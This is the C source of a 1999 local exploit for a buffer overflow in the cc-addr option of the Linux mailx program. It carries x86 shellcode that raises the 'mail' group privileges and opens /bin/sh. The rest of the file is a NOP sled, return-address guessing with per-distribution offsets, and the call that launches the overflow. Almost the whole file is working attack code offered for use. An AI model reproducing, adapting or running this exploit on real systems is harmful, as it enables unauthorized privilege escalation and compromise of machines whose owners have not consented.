 /*
  * ..just couse it is no longer secret :>
  *
  * mailx sploit (linux x86)
  * funkySh 3/07/99
  * tested under Slackware 3.6,4.0,7.0  offset = 0-500
  *              Debian  2.0r2,2.1,2.2  offset = -7000  ..ugh ;]
  *
  * buffer overrun in cc-addr option, gives "mail" group privileges
  * (if mailx is installed setgid mail).
  * Remember to define GID - it is different on Slack/Debian
  *
  */
 
 #include <stdio.h>
 
 #define GID    "\x08"  // Debian
 //#define GID    "\x0c"  // Slackware
 
 char code[] = "\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1"GID"\x31"
               "\xc0\xb0\x47\xcd\x80\x31\xdb\x31\xc9\xb3"GID"\xb1"
                GID"\x31\xc0\xb0\x47\xcd\x80\xeb\x1f\x5e\x89\x76"
               "\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89"
               "\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
               "\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
               /* setregid + generic shell code */
 
 #define BUFFER 10000
 #define NOP 0x90
 #define PATH "/usr/bin/Mail"
 
 char buf[BUFFER];
 
 unsigned long getesp(void) {
    __asm__("movl %esp,%eax");
    }
 int main(int argc, char * argv[])
 {
   int i, offset = 0;
   long address;
   if(argc > 1) offset = atoi(argv[1]);
   address = getesp() -11000 + offset;
   memset(buf,NOP,BUFFER);
   memcpy(buf+800,code,strlen(code));
   for(i=876;i<BUFFER-2;i+=4)
     *(int *)&buf[i]=address;
   fprintf (stderr, "Hit '.' to get shell..\n");
   execl(PATH, PATH, "x","-s","x","-c", buf,0);
 }
 
